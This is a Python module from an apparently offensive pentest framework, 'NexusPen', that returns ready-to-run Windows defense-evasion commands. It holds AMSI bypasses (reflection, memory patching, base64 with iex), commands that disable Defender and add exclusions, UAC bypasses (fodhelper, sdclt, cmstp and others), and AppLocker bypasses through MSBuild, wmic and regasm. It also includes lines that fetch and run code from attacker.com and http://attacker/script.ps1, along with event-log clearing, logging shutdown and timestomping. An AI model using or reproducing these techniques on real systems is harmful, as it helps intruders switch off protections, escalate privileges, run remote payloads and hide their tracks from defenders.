#!/usr/bin/env python3
"""
NexusPen - Windows Defense Evasion Module
===========================================
Bypassing Windows security controls.
"""

import subprocess
from typing import Dict, List, Optional
from dataclasses import dataclass
import base64

from rich.console import Console

console = Console()


class AMSIBypass:
    """
    AMSI (Anti-Malware Scan Interface) bypass techniques.
    """
    
    @staticmethod
    def reflection_bypass() -> str:
        """PowerShell reflection bypass."""
        return '''
# Classic reflection bypass (may be flagged)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Alternative
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
'''
    
    @staticmethod
    def patching_bypass() -> str:
        """Memory patching bypass."""
        return '''
# Force error in amsi.dll by patching AmsiOpenSession
$Win32 = @"
using System;using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "AmsiOpenSession")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xb8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
'''
    
    @staticmethod
    def obfuscated_bypass() -> str:
        """Obfuscated AMSI bypass."""
        # Base64 encoded bypass
        bypass = "W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp"
        
        return f'''
# Base64 encoded execution
$b = [System.Convert]::FromBase64String("{bypass}")
$s = [System.Text.Encoding]::UTF8.GetString($b)
iex $s
'''


class DefenderBypass:
    """
    Windows Defender evasion techniques.
    """
    
    @staticmethod
    def disable_defender() -> str:
        """Disable Windows Defender (requires admin)."""
        return '''
# PowerShell (requires admin)
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true
Set-MpPreference -DisableArchiveScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true

# Via registry
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
'''
    
    @staticmethod
    def add_exclusions(paths: List[str] = None) -> str:
        """Add Defender exclusions."""
        paths = paths or ['C:\\Temp', 'C:\\Windows\\Tasks']
        
        commands = []
        for path in paths:
            commands.append(f'Add-MpPreference -ExclusionPath "{path}"')
        
        # Process exclusions
        commands.append('Add-MpPreference -ExclusionProcess "powershell.exe"')
        commands.append('Add-MpPreference -ExclusionProcess "cmd.exe"')
        
        return '\n'.join(commands)
    
    @staticmethod
    def tamper_protection_check() -> str:
        """Check if Tamper Protection is enabled."""
        return '''
# Check Tamper Protection status
Get-MpComputerStatus | Select-Object IsTamperProtected

# If enabled, Defender settings cannot be changed programmatically
# Requires physical access or GPO to disable
'''


class ETWBypass:
    """
    ETW (Event Tracing for Windows) bypass.
    """
    
    @staticmethod
    def patch_etw() -> str:
        """Patch ETW to disable logging."""
        return '''
# PowerShell ETW bypass
$patch = @"
using System;using System.Runtime.InteropServices;
public class Etw {
    [DllImport("ntdll.dll")]public static extern int EtwEventWrite(IntPtr a, IntPtr b, uint c, IntPtr d);
}
"@
Add-Type $patch

# Patch ntdll!EtwEventWrite to return immediately
$ntdll = [Diagnostics.Process]::GetCurrentProcess().Modules | Where-Object {$_.ModuleName -eq "ntdll.dll"} | Select-Object -First 1
'''


class UACBypass:
    """
    UAC bypass techniques.
    """
    
    @staticmethod
    def fodhelper() -> str:
        """Fodhelper UAC bypass."""
        return '''
# Fodhelper bypass (works on Windows 10)
# No UAC prompt for high-integrity DelegateExecute

reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /ve /t REG_SZ /d "C:\\Windows\\System32\\cmd.exe" /f
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v DelegateExecute /t REG_SZ /d "" /f
fodhelper.exe

# Cleanup
reg delete "HKCU\\Software\\Classes\\ms-settings" /f
'''
    
    @staticmethod
    def computerdefaults() -> str:
        """ComputerDefaults UAC bypass."""
        return '''
# ComputerDefaults bypass
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /ve /t REG_SZ /d "C:\\temp\\payload.exe" /f
reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /v DelegateExecute /t REG_SZ /d "" /f
computerdefaults.exe

# Cleanup
reg delete "HKCU\\Software\\Classes\\ms-settings" /f
'''
    
    @staticmethod
    def eventvwr() -> str:
        """Event Viewer UAC bypass."""
        return '''
# Event Viewer bypass (older Windows versions)
reg add "HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command" /ve /t REG_SZ /d "C:\\temp\\payload.exe" /f
eventvwr.exe

# Cleanup
reg delete "HKCU\\Software\\Classes\\mscfile" /f
'''
    
    @staticmethod
    def sdclt() -> str:
        """SdClt UAC bypass."""
        return '''
# SdClt backup bypass
reg add "HKCU\\Software\\Classes\\Folder\\Shell\\open\\command" /ve /t REG_SZ /d "C:\\temp\\payload.exe" /f
reg add "HKCU\\Software\\Classes\\Folder\\Shell\\open\\command" /v DelegateExecute /t REG_SZ /d "" /f
sdclt.exe

# Cleanup
reg delete "HKCU\\Software\\Classes\\Folder" /f
'''
    
    @staticmethod
    def cmstp() -> str:
        """CMSTP UAC bypass."""
        return '''
# Create INF file
@echo off
echo [version] > bypass.inf
echo Signature=$chicago$ >> bypass.inf
echo [DefaultInstall] >> bypass.inf
echo UnregisterOCXs=UnregisterOCXSection >> bypass.inf
echo [UnregisterOCXSection] >> bypass.inf
echo %11%\\scrobj.dll,NI,http://attacker.com/shell.sct >> bypass.inf

# Execute
cmstp /s /ns bypass.inf
'''


class AppLockerBypass:
    """
    AppLocker bypass techniques.
    """
    
    @staticmethod
    def msbuild() -> str:
        """MSBuild AppLocker bypass."""
        return '''
# Create payload.xml
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Build">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
        public class ClassExample : Task, ITask {
          public override bool Execute() {
            // Shellcode or command here
            System.Diagnostics.Process.Start("cmd.exe");
            return true;
          }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

# Execute
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe payload.xml
'''
    
    @staticmethod
    def installutil() -> str:
        """InstallUtil AppLocker bypass."""
        return '''
# Compile C# payload with Uninstall method
# Execute with InstallUtil
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe
'''
    
    @staticmethod
    def regasm() -> str:
        """RegAsm/RegSvcs bypass."""
        return '''
# RegAsm DLL execution
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /U payload.dll

# RegSvcs
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regsvcs.exe payload.dll
'''
    
    @staticmethod
    def wmic() -> str:
        """WMIC XSL bypass."""
        return '''
# Create payload.xsl
<?xml version='1.0'?>
<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt" xmlns:user="placeholder" version="1.0">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
]]>
</ms:script>
</stylesheet>

# Execute
wmic os get /format:"http://attacker.com/payload.xsl"
# Or local
wmic os get /format:"payload.xsl"
'''
    
    @staticmethod
    def cscript_wscript() -> str:
        """CScript/WScript bypass."""
        return '''
# VBS payload
Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c powershell -ep bypass"

# JScript payload
var shell = new ActiveXObject("WScript.Shell");
shell.Run("cmd.exe");

# Execute from alternate location
cscript.exe \\\\attacker\\share\\payload.vbs
'''
    
    @staticmethod
    def powershell_clm_bypass() -> str:
        """PowerShell Constrained Language Mode bypass."""
        return '''
# Check language mode
$ExecutionContext.SessionState.LanguageMode

# Bypass via PowerShell 2 (if available)
powershell.exe -version 2 -ep bypass

# Via PSByPassCLM
# Compile and run C# app that spawns PowerShell in Full Language Mode

# Via runspaceWithFullLanguage
# Custom runspace with full language mode
'''


class CLMBypass:
    """
    Constrained Language Mode bypasses.
    """
    
    @staticmethod
    def downgrade() -> str:
        """PowerShell version downgrade."""
        return '''
# Check if PS v2 is available
reg query "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\1\\PowerShellEngine" /v PowerShellVersion
reg query "HKLM\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" /v PowerShellVersion

# Downgrade to v2 (bypasses many protections)
powershell.exe -version 2 -ExecutionPolicy bypass

# Note: PS v2 may be removed on modern systems
'''
    
    @staticmethod
    def runspace_bypass() -> str:
        """Custom runspace bypass."""
        return '''
# C# code to create unrestricted runspace
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

Runspace rs = RunspaceFactory.CreateRunspace();
rs.Open();
PowerShell ps = PowerShell.Create();
ps.Runspace = rs;
ps.AddScript("IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')");
ps.Invoke();
'''


class LogEvasion:
    """
    Windows logging evasion.
    """
    
    @staticmethod
    def clear_logs() -> str:
        """Clear Windows event logs."""
        return '''
# Clear all logs (requires admin)
wevtutil cl System
wevtutil cl Security
wevtutil cl Application
wevtutil cl "Windows PowerShell"
wevtutil cl "Microsoft-Windows-PowerShell/Operational"

# PowerShell
Get-EventLog -List | ForEach-Object { Clear-EventLog -LogName $_.Log }

# Or
wevtutil el | Foreach-Object {wevtutil cl "$_"}
'''
    
    @staticmethod
    def disable_logging() -> str:
        """Disable various logging."""
        return '''
# Disable PowerShell Script Block Logging
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f

# Disable Module Logging
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v EnableModuleLogging /t REG_DWORD /d 0 /f

# Disable Transcription
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription" /v EnableTranscripting /t REG_DWORD /d 0 /f
'''
    
    @staticmethod
    def timestomp() -> str:
        """Modify file timestamps."""
        return '''
# PowerShell timestomp
$file = "C:\\temp\\payload.exe"
$date = Get-Date "01/01/2020 00:00:00"
$(Get-Item $file).CreationTime = $date
$(Get-Item $file).LastAccessTime = $date  
$(Get-Item $file).LastWriteTime = $date
'''
